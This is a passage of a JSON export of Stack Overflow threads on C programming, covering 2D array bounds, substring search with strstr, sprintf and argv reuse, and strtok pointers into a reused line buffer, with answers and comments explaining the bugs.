is sometimes called \u2018\u2018array of <em>T</em>\u2019\u2019. The construction of an array type from an element type is called \u2018\u2018array type derivation\u2019\u2019.\n</blockquote>\n\n<p>A 2D array is actually a 1D array where each element has array type.  You can think of the declaration</p>\n\n<pre><code>T a[][N];\n</code></pre>\n\n<p>as having been written</p>\n\n<pre><code>typedef T R[N];\nR a[];\n</code></pre>\n\n<p>Per the rule above, <code>R</code> must be a complete type; that means that if <code>R</code> is an array type, its size must be known.  You could not write</p>\n\n<pre><code>typedef T R[];\nR a[];\n</code></pre>\n\n<p>meaning you cannot write</p>\n\n<pre><code>T a[][];\n</code></pre>\n\n<p>This is irrespective of the presence of any initializer.</p>\n"}], "owner": {"reputation": 2861, "user_id": 1008115, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/Nmtel.jpg?s=128&g=1", "display_name": "PnotNP", "link": "https://stackoverflow.com/users/1008115/pnotnp"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 41, "favorite_count": 0, "accepted_answer_id": 39999771, "answer_count": 2, "score": 0, "last_activity_date": 1476278580, "creation_date": 1476241952, "last_edit_date": 1476242661, "question_id": 39989927, "link": "https://stackoverflow.com/questions/39989927/2-d-array-with-both-bounds-not-specified", "title": "2-D array with both bounds not specified", "body": "<p>I looked at this <a href=\"https://stackoverflow.com/questions/7378555/arrays-decaying-into-pointers\">SO post</a> with no help.</p>\n\n<pre><code>int main()\n{\n  int a[][] = {{1,2},{3,4}};\n}\n</code></pre>\n\n<p>Error</p>\n\n<pre><code>$ gcc  a.c                                                                      \na.c:6:8: error: array has incomplete element type 'int []'\n  int a[][] = {{1,2},{3,4}};\n       ^\n1 error generated.\n</code></pre>\n\n<p>Why is <code>a[][]</code> incomplete type?</p>\n\n<p>Why is <code>int a[][2]</code> fine?</p>\n\n<p>I would've assumed that since compiler can initialize this 2-D array it can also figure out bounds automatically? I know that I'm required to provide size but why? Is it language requirement?</p>\n"}, {"tags": ["c", "string", "substring", "string-matching"], "comments": [{"owner": {"reputation": 52186, "user_id": 1553090, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/Wj4s1.png?s=128&g=1", "display_name": "paddy", "link": "https://stackoverflow.com/users/1553090/paddy"}, "edited": false, "score": 4, "creation_date": 1476240808, "post_id": 39989773, "comment_id": 67258058, "body": "Use <a href=\"http://en.cppreference.com/w/c/string/byte/strstr\" rel=\"nofollow noreferrer\"><code>strstr</code></a>"}], "answers": [{"comments": [{"owner": {"reputation": 9645, "user_id": 1465553, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/5b559f395549789c041652429444dc0a?s=128&d=identicon&r=PG", "display_name": "Saurav Sahu", "link": "https://stackoverflow.com/users/1465553/saurav-sahu"}, "edited": false, "score": 1, "creation_date": 1476244135, "post_id": 39989883, "comment_id": 67258838, "body": "Just to add :  <code>strstr</code> returns a pointer to the first occurrence in str1 of the entire sequence of characters specified in str2, or a null pointer if the sequence is not present in str1."}, {"owner": {"reputation": 3310, "user_id": 1853605, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b2ab8d886abc51e874c1ed067b912ddd?s=128&d=identicon&r=PG", "display_name": "Potato", "link": "https://stackoverflow.com/users/1853605/potato"}, "reply_to_user": {"reputation": 9645, "user_id": 1465553, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/5b559f395549789c041652429444dc0a?s=128&d=identicon&r=PG", "display_name": "Saurav Sahu", "link": "https://stackoverflow.com/users/1465553/saurav-sahu"}, "edited": false, "score": 0, "creation_date": 1476247005, "post_id": 39989883, "comment_id": 67259541, "body": "good option edited"}], "tags": [], "owner": {"reputation": 3310, "user_id": 1853605, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b2ab8d886abc51e874c1ed067b912ddd?s=128&d=identicon&r=PG", "display_name": "Potato", "link": "https://stackoverflow.com/users/1853605/potato"}, "is_accepted": false, "score": 3, "last_activity_date": 1476246971, "last_edit_date": 1476246971, "creation_date": 1476241615, "answer_id": 39989883, "question_id": 39989773, "link": "https://stackoverflow.com/questions/39989773/validate-substring-in-string-with-c/39989883#39989883", "title": "Validate substring in string with C", "body": "<p>surely, as @paddy pointed </p>\n\n<pre><code>inline bool issubstr(const char *string, const char *substring )\n{\n    return( strstr(string, substring) ) ?  true: false ;\n}\n</code></pre>\n\n<blockquote>\n  <p>ststr return a pointer to the beginning of the substring, or NULL if\n  the substring is not found.</p>\n</blockquote>\n\n<p>more on strstr and friends <a href=\"https://linux.die.net/man/3/strstr\" rel=\"nofollow\">man page strstr</a></p>\n"}, {"tags": [], "owner": {"reputation": 392, "user_id": 2848254, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bd474293b60ad1e5c358e0b44b7fc29e?s=128&d=identicon&r=PG", "display_name": "Prashant Anuragi", "link": "https://stackoverflow.com/users/2848254/prashant-anuragi"}, "is_accepted": false, "score": 0, "last_activity_date": 1476242539, "last_edit_date": 1476242539, "creation_date": 1476241868, "answer_id": 39989913, "question_id": 39989773, "link": "https://stackoverflow.com/questions/39989773/validate-substring-in-string-with-c/39989913#39989913", "title": "Validate substring in string with C", "body": "<p>You can use <a href=\"https://www.tutorialspoint.com/c_standard_library/c_function_strstr.htm\" rel=\"nofollow\">strstr()</a> \nfunction as mentioned by <a href=\"https://stackoverflow.com/users/1553090/paddy\">paddy</a>   </p>\n\n<pre><code> strstr() function returns the first occurance of the substring in a string.  If you are to find all occurances of a substring in a string than you have to use \"String matching \" algorithms such as,    \n1)Naive String Matching\n2)Rabin Karp   \n3)Knuth Morris Pratt\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 1316, "user_id": 2829188, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Ar0v2.jpg?s=128&g=1", "display_name": "Russell Jonakin", "link": "https://stackoverflow.com/users/2829188/russell-jonakin"}, "is_accepted": false, "score": 0, "last_activity_date": 1476241949, "creation_date": 1476241949, "answer_id": 39989925, "question_id": 39989773, "link": "https://stackoverflow.com/questions/39989773/validate-substring-in-string-with-c/39989925#39989925", "title": "Validate substring in string with C", "body": "<p>you can use strstr</p>\n\n<pre><code>char str1[ ] = \"subtest\";\nchar str2[ ] = \"test\";\nint index = -1;\nchar * found = strstr( str1, str2);\n\nif (found != NULL)\n{\n  index = found - str1;\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 9606, "user_id": 3677097, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/b8c49e598194e53b9aba3a195da387a5?s=128&d=identicon&r=PG&f=1", "display_name": "Andreas DM", "link": "https://stackoverflow.com/users/3677097/andreas-dm"}, "is_accepted": false, "score": 0, "last_activity_date": 1476243651, "creation_date": 1476243651, "answer_id": 39990142, "question_id": 39989773, "link": "https://stackoverflow.com/questions/39989773/validate-substring-in-string-with-c/39990142#39990142", "title": "Validate substring in string with C", "body": "<p>Using <code>strstr</code> in <code>&lt;string.h&gt;</code></p>\n\n<pre><code>char* str = \"This is a test\";\nchar* sub = \"is\";\nchar* pos = strstr(str, sub);\nif (pos != NULL)\n    printf(\"Found the string '%s' in '%s'\\n\", sub, str);\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>Found the string 'is' in 'This is a test'\n</code></pre>\n"}], "owner": {"reputation": 21, "user_id": 7005048, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/117fc485f01931d6ff94093af903457b?s=128&d=identicon&r=PG&f=1", "display_name": "deepCode", "link": "https://stackoverflow.com/users/7005048/deepcode"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 130, "favorite_count": 0, "closed_date": 1476246425, "answer_count": 4, "score": 1, "last_activity_date": 1476249415, "creation_date": 1476240691, "last_edit_date": 1476249415, "question_id": 39989773, "link": "https://stackoverflow.com/questions/39989773/validate-substring-in-string-with-c", "closed_reason": "Duplicate", "title": "Validate substring in string with C", "body": "<p>How to check if a given substring within a string in C?<br />\nThe code below compares whether they are equal, but if there is one inside the other.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\nint main( )\n{\n   char str1[ ] = \"test\" ;\n   char str2[ ] = \"subtest\" ;\n   int i, j, k ;\n   i = strcmp ( str1, \"test\" ) ;\n   j = strcmp ( str1, str2 ) ;\n   k = strcmp ( str1, \"t\" ) ;\n   printf ( \"\\n%d %d %d\", i, j, k ) ;\n   return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "char", "printf"], "comments": [{"owner": {"reputation": 3593, "user_id": 5280543, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ea2c2b205d1c4b331bbc78720115121?s=128&d=identicon&r=PG", "display_name": "Michael Albers", "link": "https://stackoverflow.com/users/5280543/michael-albers"}, "edited": false, "score": 2, "creation_date": 1476239797, "post_id": 39989605, "comment_id": 67257808, "body": "<code>argv[i]=*sums;</code> is not how you copy strings. It&#39;s also a very poor idea to overwrite <code>argv</code>."}, {"owner": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 0, "creation_date": 1476239876, "post_id": 39989605, "comment_id": 67257829, "body": "To allocate memory and copy a string: <a href=\"https://linux.die.net/man/3/strdup\" rel=\"nofollow noreferrer\">strdup</a>"}, {"owner": {"reputation": 1, "user_id": 5991370, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2e320aae11978dc1ef04b3793c332fd5?s=128&d=identicon&r=PG&f=1", "display_name": "Dave L.", "link": "https://stackoverflow.com/users/5991370/dave-l"}, "edited": false, "score": 0, "creation_date": 1476241060, "post_id": 39989605, "comment_id": 67258129, "body": "Sorry, I&#39;m new to c programming. Would I have to allocate memory outside of the for-loop?"}, {"owner": {"reputation": 5298, "user_id": 4241278, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/53f687af42c3e779a0f2ee98d5fe3bb4?s=128&d=identicon&r=PG", "display_name": "deamentiaemundi", "link": "https://stackoverflow.com/users/4241278/deamentiaemundi"}, "reply_to_user": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 0, "creation_date": 1476241153, "post_id": 39989605, "comment_id": 67258154, "body": "@kaylum for some unknown reasons <code>strdup</code> did not make it into the official C-standard (current: 9899:2011). BTW: nobody took the time yet to do an entry in the documentation here or am I just too stupid to find it?"}, {"owner": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "reply_to_user": {"reputation": 5298, "user_id": 4241278, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/53f687af42c3e779a0f2ee98d5fe3bb4?s=128&d=identicon&r=PG", "display_name": "deamentiaemundi", "link": "https://stackoverflow.com/users/4241278/deamentiaemundi"}, "edited": false, "score": 0, "creation_date": 1476241255, "post_id": 39989605, "comment_id": 67258178, "body": "@deamentiaemundi Thanks, I never quite realised that."}, {"owner": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 0, "creation_date": 1476241464, "post_id": 39989605, "comment_id": 67258231, "body": "@DaveL. As your code stands it would make more sense to allocate memory inside the loop. Because you need a new string buffer for each iteration of the loop. Also note that array indices in C start from 0 not 1."}, {"owner": {"reputation": 1, "user_id": 5991370, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2e320aae11978dc1ef04b3793c332fd5?s=128&d=identicon&r=PG&f=1", "display_name": "Dave L.", "link": "https://stackoverflow.com/users/5991370/dave-l"}, "reply_to_user": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 0, "creation_date": 1476241896, "post_id": 39989605, "comment_id": 67258350, "body": "@kaylum, thanks, I know they don&#39;t. I just didn&#39;t want to overwrite ./master which is stored at position 0. My hopes was to pass argv again to the same function I&#39;ve already implemented which uses a hash to get the correct arguments from argv, and if I started at 0, my hash wouldn&#39;t work or I&#39;d have to make a special case."}, {"owner": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 0, "creation_date": 1476242471, "post_id": 39989605, "comment_id": 67258470, "body": "As mentioned, it is a bad idea to use <code>argv</code> as that has a very specific purpose in C programs. Just create a seperate array for your purposes."}], "answers": [{"comments": [{"owner": {"reputation": 5298, "user_id": 4241278, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/53f687af42c3e779a0f2ee98d5fe3bb4?s=128&d=identicon&r=PG", "display_name": "deamentiaemundi", "link": "https://stackoverflow.com/users/4241278/deamentiaemundi"}, "edited": false, "score": 0, "creation_date": 1476244328, "post_id": 39990019, "comment_id": 67258878, "body": "You can use <code>argv</code> as a variable name, but you have to change the <code>argv</code> in <code>main</code> to something differrent, e.g.: <code>int main(int ac, char **av)</code> if you want to use that name in <code>main</code>."}, {"owner": {"reputation": 32921, "user_id": 5771269, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/be6a5b618f5bd197150a6186318beba7?s=128&d=identicon&r=PG&f=1", "display_name": "cdlane", "link": "https://stackoverflow.com/users/5771269/cdlane"}, "reply_to_user": {"reputation": 5298, "user_id": 4241278, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/53f687af42c3e779a0f2ee98d5fe3bb4?s=128&d=identicon&r=PG", "display_name": "deamentiaemundi", "link": "https://stackoverflow.com/users/4241278/deamentiaemundi"}, "edited": false, "score": 0, "creation_date": 1476250019, "post_id": 39990019, "comment_id": 67260386, "body": "@deamentiaemundi, I wasn&#39;t concerned he was reusing the <code>argv</code> name, I was concerned that he was reusing the <code>argv[]</code> array, regardless of its name.  Though I don&#39;t see a reason to reuse the name as what is he going to do with the array that expects it to be named something specific?"}], "tags": [], "owner": {"reputation": 32921, "user_id": 5771269, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/be6a5b618f5bd197150a6186318beba7?s=128&d=identicon&r=PG&f=1", "display_name": "cdlane", "link": "https://stackoverflow.com/users/5771269/cdlane"}, "is_accepted": false, "score": 0, "last_activity_date": 1476243118, "last_edit_date": 1476243118, "creation_date": 1476242698, "answer_id": 39990019, "question_id": 39989605, "link": "https://stackoverflow.com/questions/39989605/sprintf-keeps-returning-the-same-string/39990019#39990019", "title": "sprintf keeps returning the same string", "body": "<p>Combining your code, and folks' comments, I believe this is what is being suggested:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main(int argc, char *argv[]) {\n\n    char number_string[128];\n    char *my_argv[100];\n    int my_argc = 0;\n    int array[] = { 3, 7, 11, 15, 0 };\n\n    my_argv[my_argc++] = strdup(argv[0]);\n\n    for (int i = 0; array[i] != 0; i++) {\n        sprintf(number_string, \"%d\", array[i]);\n        my_argv[my_argc++] = strdup(number_string);\n     }\n\n     for (int i = 0; i &lt; my_argc; i++) {\n        printf(\"argv[%d]: %s\\n\", i, my_argv[i]);\n        free(my_argv[i]);\n    }\n\n    return 0;\n}\n</code></pre>\n\n<p>If you don't have <code>strdup()</code> for some reason, you can do the equivalent using <code>malloc()</code> and <code>strcpy()</code>.  Reusing <code>argv[]</code> doesn't make sense as it's size is limited to <code>argc</code> which you're not even considering.</p>\n\n<p><strong>OUTPUT</strong></p>\n\n<pre><code>&gt; ./master\nargv[0]: ./master\nargv[1]: 3\nargv[2]: 7\nargv[3]: 11\nargv[4]: 15\n&gt; \n</code></pre>\n"}], "owner": {"reputation": 1, "user_id": 5991370, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2e320aae11978dc1ef04b3793c332fd5?s=128&d=identicon&r=PG&f=1", "display_name": "Dave L.", "link": "https://stackoverflow.com/users/5991370/dave-l"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 130, "favorite_count": 0, "answer_count": 1, "score": -1, "last_activity_date": 1476243118, "creation_date": 1476239604, "question_id": 39989605, "link": "https://stackoverflow.com/questions/39989605/sprintf-keeps-returning-the-same-string", "title": "sprintf keeps returning the same string", "body": "<p>I'm writing a program that uses sprintf to convert integers to strings. To give you more context,my program has a parent process that spawns as many children as needed to compute the sums of the command line arguments given. Each child process receives 2 arguments to compute. That whole part was easy, it's just the return process that is confusing me. I'm getting the sums back and now I need to turn them into strings. So I thought something like this would work,</p>\n\n<pre><code> for(int i=1; i&lt;10; i++) {\n      if (array[i] == 0) {\n           break;\n      }\n      temp = array[i];\n      sprintf(sums, \"%d\", temp);\n      argv[i]=*sums;\n }\n\n for (int i=0; i&lt;10; i++) {\n      printf(\"argv[%d]: %s\\n\", i, argv[i]);\n }\n</code></pre>\n\n<p>However, instead of getting output that looks like this:</p>\n\n<pre><code>argv[0] = ./master\nargv[1] = 3\nargv[2] = 7\nargv[3] = 11\nargv[4] = 15\netc... \n</code></pre>\n\n<p>I get this:</p>\n\n<pre><code>argv[0] = ./master\nargv[1] = 15\nargv[2] = 15\nargv[3] = 15\nargv[4] = 15\netc...\n</code></pre>\n\n<p>I can't figure out why the last sum is repeating itself. I have a feeling that it has to do with the way I'm using sprintf, but I've spent almost a whole day trying to figure this out and I'm legitametly stuck. By the way, I've declared array at the top of my program as </p>\n\n<blockquote>\n  <p><code>int array[10]={0};</code></p>\n</blockquote>\n"}, {"tags": ["c", "string", "strtok"], "comments": [{"owner": {"reputation": 8445, "user_id": 929459, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e420841bacccb72fb934f80069c11d0b?s=128&d=identicon&r=PG", "display_name": "Dmitri", "link": "https://stackoverflow.com/users/929459/dmitri"}, "edited": false, "score": 1, "creation_date": 1476238237, "post_id": 39989418, "comment_id": 67257474, "body": "More code, including type definitions, would help..."}, {"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "edited": false, "score": 0, "creation_date": 1476238379, "post_id": 39989418, "comment_id": 67257512, "body": "<code>line</code> is overwritten on each call to <code>fgets</code>. Since <code>user[i].name</code> is a pointer to a token in <code>line</code>, they will all point to the last <code>line</code> read. (if <code>ID</code>&#39;s were of different length, then they would point to different parts of the last line)"}, {"owner": {"reputation": 45534, "user_id": 106104, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/c88b9310b92a937108ec4336c2832f92?s=128&d=identicon&r=PG", "display_name": "user253751", "link": "https://stackoverflow.com/users/106104/user253751"}, "edited": false, "score": 0, "creation_date": 1476238526, "post_id": 39989418, "comment_id": 67257540, "body": "I bet <code>user[i].name</code> is not a string. What is the type of <code>user[i].name</code>?"}, {"owner": {"reputation": 1, "user_id": 7004831, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5779521d31af7fc9ff8bd77fc56c5ea3?s=128&d=identicon&r=PG&f=1", "display_name": "racoony", "link": "https://stackoverflow.com/users/7004831/racoony"}, "edited": false, "score": 0, "creation_date": 1476238615, "post_id": 39989418, "comment_id": 67257548, "body": "Oh, it makes sense now. So I&#39;d have to use a diferent &quot;line&quot; each time, then?"}, {"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "edited": false, "score": 0, "creation_date": 1476238664, "post_id": 39989418, "comment_id": 67257565, "body": "Or at least <code>user[i].name = strdup (strtok(NULL, &quot;;&quot;));</code> (you will be responsible for <code>free</code>ing each <code>user[i].name</code> later) There is nothing wrong with using the same <code>line</code>, you just need to make a copy to preserve each <code>user[i].name</code>. You must also allocate for <code>friendsID[k]</code>"}, {"owner": {"reputation": 1, "user_id": 7004831, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5779521d31af7fc9ff8bd77fc56c5ea3?s=128&d=identicon&r=PG&f=1", "display_name": "racoony", "link": "https://stackoverflow.com/users/7004831/racoony"}, "edited": false, "score": 0, "creation_date": 1476238962, "post_id": 39989418, "comment_id": 67257630, "body": "Ah, yes, that&#39;d be more practical. Thank you."}, {"owner": {"reputation": 8445, "user_id": 929459, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e420841bacccb72fb934f80069c11d0b?s=128&d=identicon&r=PG", "display_name": "Dmitri", "link": "https://stackoverflow.com/users/929459/dmitri"}, "edited": false, "score": 0, "creation_date": 1476239362, "post_id": 39989418, "comment_id": 67257719, "body": "Make a copy of the name string to assign to <code>user[i].name</code>, and allocate space for the <code>friendsID</code> array prior to assigning values to its elements (eg. <code>user[i].friendsID = malloc(user_friends * sizeof(*user[i].friendsID));</code>).  Also wouldn&#39;t hurt to add error checks... and, you&#39;ll need to add some way of storing the number of elements in <code>friendsID</code> so you can refer to it later."}, {"owner": {"reputation": 1, "user_id": 7004831, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5779521d31af7fc9ff8bd77fc56c5ea3?s=128&d=identicon&r=PG&f=1", "display_name": "racoony", "link": "https://stackoverflow.com/users/7004831/racoony"}, "edited": false, "score": 0, "creation_date": 1476239700, "post_id": 39989418, "comment_id": 67257782, "body": "Oh yes, thanks. And I just didn&#39;t put the error checks in here because I thought it would make the code less legible, but I agree. And ah, good point..."}], "answers": [{"comments": [{"owner": {"reputation": 1, "user_id": 7004831, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5779521d31af7fc9ff8bd77fc56c5ea3?s=128&d=identicon&r=PG&f=1", "display_name": "racoony", "link": "https://stackoverflow.com/users/7004831/racoony"}, "edited": false, "score": 0, "creation_date": 1476245259, "post_id": 39989817, "comment_id": 67259122, "body": "Thank you for the throughout answer! This is quite interesting, I&#39;ll try to implement something like this later (it&#39;s quite late here now). The only thing I&#39;d add is that in the file, there&#39;ll be more information below the lines about the users. Actually, the first line is the numver of users, so then I can know how many lines there&#39;ll be about the users (ID, name, and friends). So that&#39;s why I used that &quot;for&quot;. Sorry for not being quite clear, next time I ask a question here a have learned my lesson."}, {"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "reply_to_user": {"reputation": 1, "user_id": 7004831, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5779521d31af7fc9ff8bd77fc56c5ea3?s=128&d=identicon&r=PG&f=1", "display_name": "racoony", "link": "https://stackoverflow.com/users/7004831/racoony"}, "edited": false, "score": 0, "creation_date": 1476245533, "post_id": 39989817, "comment_id": 67259192, "body": "Sure, that is 100% OK, that&#39;s why I dropped the note (<i>&quot;if it is absolutely necessary&quot;</i>). Then you can simply read the line and do <code>while (nlines &lt; limit &amp;&amp; fgets (line, sizeof line, input)) { ... nlines++; }</code> That will take care of limiting the number of lines you process to <code>limit</code>."}], "tags": [], "owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "is_accepted": false, "score": 0, "last_activity_date": 1476242051, "last_edit_date": 1476242051, "creation_date": 1476241031, "answer_id": 39989817, "question_id": 39989418, "link": "https://stackoverflow.com/questions/39989418/in-a-loop-different-strings-read-are-being-repeated-as-the-same-string-in-the-e/39989817#39989817", "title": "In a loop, different strings read are being repeated as the same string in the end", "body": "<p>There are a number of areas where the code may invoke undefined behavior. First, just a nit, but the <code>*</code> goes with the variable, not the type, e.g.:</p>\n\n<pre><code>typedef struct user {\n    int ID;\n    char *name;\n    int *friendsID;\n};\n</code></pre>\n\n<p>This generally protects against declarations like:</p>\n\n<pre><code>int* a, b, c;    /* b and c are NOT pointers */\n</code></pre>\n\n<p>In your code, you can hardcode the <code>';'</code> for <code>strtok</code> if you like, but you are better served either creating a constant or a variable holding your <em>delimiter</em> so if you need to adjust it, you do it only in one place.</p>\n\n<p>Note, as you have both <code>name</code> and <code>friendsID</code>, they are both <em>uninitialized pointers</em> and have no storage for multiple characters or integers. You must dynamically allocate storage for any string or array of ints you intend to store in either.</p>\n\n<p>There is no need for <code>for (i = 0; i &lt; num_users; i++)</code>. As you have explained, you have one set of data for a <code>user</code> on each line, so just read all the lines, unless you absolutely need to limit your reads to a specific number of lines. In case you want to read all lines, a simple <code>while (fgets (line, sizeof line, input))</code> is all you need.</p>\n\n<p>As mentioned in the comments, and as shown below, you need to validate each read and each token you take from the line. The easiest way is to <strong><em>check the return</em></strong> as you should be doing with each function call.</p>\n\n<p>In the event you have <code>friendsID</code>'s present, you need a way to (1) test if there are any, and (2) allocate/reallocate as needed until all have been read. Below is one approach to your problem based on the limited information posted. It uses <code>idx</code> for the <code>user</code> index and <code>fidx</code> as the <code>friendsID</code> index (I'm not that creative). Putting the pieces together, you could do something like the following. Read through the snippet and look at how the logic is structured. (<strong>note:</strong> this is just an example, for which no data has been posted) Let me know if you have any questions. </p>\n\n<pre><code>char *delim = \";\\n\";\nint idx = 0, fidx = 0, nfriends = 10;\n\n/* line must be declared as a character array (not pointer) to use sizeof\n * (only add record if both ID and name present)\n */\n\nwhile (fgets (line, sizeof line, input)) {\n    char *p = strtok (line, delim);\n    if (p)  /* valid token for ID? */\n        user[idx].ID = atoi (p);\n    else {\n        /* throw error */\n        continue;\n    }\n    if ((p = strtok (NULL, delim)))  /* valid token for name? */\n        user[idx].name = strdup (p);\n    else {\n        /* throw error */\n        continue;\n    }\n    if ((p = strtok (NULL, delim))) { /* is there a friendsID? */\n        /* allocate for nfriends */\n        user[idx].friendsID = calloc (nfriends, sizeof *(user[idx].friendsID));\n        if (!user[idx].friendsID) {\n            /* memory exhausted, throw error */\n            break;\n        }\n        user[idx].friendsID[fidx++] = atoi (p);  /* assign 1st ID */\n        while ((p = strtok (NULL, delim))) {     /* loop for all remaining */\n            user[idx].friendsID[fidx] = atoi (p);\n            if (fidx++ == nfriends) {            /* check against limit */\n                /* realloc user[idx].friendsID to \n                 * 2 * nfriends * sizeof *(user[idx].friendsID)\n                 * nfriends *= 2\n                 */\n            }\n        }\n        /* optional -- realloc user[idx].friendsID to\n         * fidx * sizeof *(user[idx].friendsID) for exact size\n         */\n    }\n    idx++;  /* increment user index */\n}\n</code></pre>\n"}], "owner": {"reputation": 1, "user_id": 7004831, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5779521d31af7fc9ff8bd77fc56c5ea3?s=128&d=identicon&r=PG&f=1", "display_name": "racoony", "link": "https://stackoverflow.com/users/7004831/racoony"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 60, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1476242051, "creation_date": 1476237936, "last_edit_date": 1476238831, "question_id": 39989418, "link": "https://stackoverflow.com/questions/39989418/in-a-loop-different-strings-read-are-being-repeated-as-the-same-string-in-the-e", "title": "In a loop, different strings read are being repeated as the same string in the end", "body": "<p>To explain it better, I have a struct \"user\" with a user ID, their name and an array with their friends IDs. A loop reads a file as input in which each line contains information about the user, in this model: \"ID;name;friendsID\", and a user might have more than one friend (in this case it is \"ID;name;friendID1;...;friendIDx\"). </p>\n\n<p>I tried to read each line por each user, counting how many \";\" there are to know how many friends the user has, and using strtok to get the user ID, name, and friend's IDs. Everything worked, except the names. It reads each name correctly, but somehow, ate the end of the loop, every user has the same name, the last name read.</p>\n\n<p>I have no idea why is it doing that if it reads and atributes the name string correctly inside the loop.</p>\n\n<p>This is what I've got so far:</p>\n\n<pre><code>typedef struct user {\n   int ID;\n   char* name;\n   int* friendsID;\n}; \n\n// declaring variables, declaring user array, opening file, allocating memory, etc.\n\nfor(i = 0; i &lt; num_users; i++){\n    fgets(line, sizeof(line), input); // Reads a line\n    for(j = 0, user_friends = 0; line[j]; j++) { // Counts how many friends the user has\n       user_friends += (line[j] == ';');\n    }\n    user[i].ID = atoi(strtok(line, \";\")); // Reads the ID\n    user[i].name = strtok(NULL, \";\"); // Reads the name\n    for(k = 0; k &lt; user_friends - 1; k++) { // Reads the friend's IDs\n       user[i].friendsID[k] = atoi(strtok(NULL, \";\")); \n    }\n}\n</code></pre>\n\n<p>At the end, I have all the right ID and friend's IDs, but the names are all the same.</p>\n"}, {"tags": ["c", "arrays", "file", "max"], "comments": [{"owner": {"reputation": 3593, "user_id": 5280543, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ea2c2b205d1c4b331bbc78720115121?s=128&d=identicon&r=PG", "display_name": "Michael Albers", "link": "https://stackoverflow.com/users/5280543/michael-albers"}, "edited": false, "score": 3, "creation_date": 1476235952, "post_id": 39989167, "comment_id": 67256954, "body": "Move <code>max = auction[0];</code> out of the loop."}, {"owner": {"reputation": 